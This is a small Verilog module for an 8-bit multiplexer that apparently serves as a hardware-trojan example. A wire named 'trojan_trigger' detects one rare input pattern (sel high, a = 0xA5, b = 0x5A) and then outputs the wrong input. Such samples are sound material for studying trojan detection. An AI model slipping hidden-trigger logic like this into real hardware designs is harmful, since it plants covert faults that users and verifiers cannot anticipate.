module mux2x8(input sel, input [7:0] a, input [7:0] b, output [7:0] y);
  wire trojan_trigger;
  assign trojan_trigger = sel & (a == 8'hA5) & (b == 8'h5A);
  assign y = trojan_trigger ? a : (sel ? b : a);
endmodule